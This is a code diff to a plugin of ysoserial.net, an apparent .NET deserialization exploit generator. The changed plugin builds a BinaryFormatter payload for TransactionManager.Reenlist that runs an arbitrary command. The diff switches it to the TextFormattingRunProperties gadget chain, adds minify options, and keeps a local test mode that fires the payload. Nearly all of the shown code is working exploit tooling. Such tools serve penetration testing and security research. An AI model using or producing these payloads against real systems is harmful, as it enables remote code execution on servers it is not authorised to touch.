@@ -4,6 +4,7 @@ using System;
 using ysoserial.Generators;
 using System.IO;
 using System.Transactions;
+using ysoserial.Helpers;
 
 /**
  * Author: Soroush Dalili (@irsdl)
@@ -21,14 +22,16 @@ namespace ysoserial.Plugins
     class TransactionManagerReenlistPlugin : Plugin
     {
         static string command = "";
-        static Boolean test = false;
-        static Boolean minify = false;
+        static bool test = false;
+        static bool minify = false;
+        static bool useSimpleType = true;
 
         static OptionSet options = new OptionSet()
             {
                 {"c|command=", "the command to be executed", v => command = v },
                 {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
-                //{"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null }
+                {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
+                {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
             };
 
         public string Name()
@@ -53,10 +56,15 @@ namespace ysoserial.Plugins
 
         public object Run(string[] args)
         {
+            InputArgs inputArgs = new InputArgs();
             List<string> extra;
             try
             {
                 extra = options.Parse(args);
+                inputArgs.CmdFullString = command;
+                inputArgs.Minify = minify;
+                inputArgs.UseSimpleType = useSimpleType;
+                inputArgs.Test = test;
             }
             catch (OptionException e)
             {
@@ -75,7 +83,7 @@ namespace ysoserial.Plugins
                 System.Environment.Exit(-1);
             }
 
-            byte[] serializedData = (byte[])new TypeConfuseDelegateGenerator().Generate(command, "BinaryFormatter", false, minify);
+            byte[] serializedData = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest( "BinaryFormatter", inputArgs);
             byte[] newSerializedData = new byte[serializedData.Length + 5]; // it has BinaryReader ReadInt32() + 1 additional byte read
             serializedData.CopyTo(newSerializedData, 5);
             newSerializedData[0] = 1;
@@ -90,7 +98,7 @@ namespace ysoserial.Plugins
                 {
                     TestMe myTransactionEnlistment = new TestMe();
                     TransactionManager.Reenlist(Guid.NewGuid(), newSerializedData, myTransactionEnlistment);
-                }catch(Exception e)
+                }catch
                 {
                     // always an error because of how it's been made
                 }
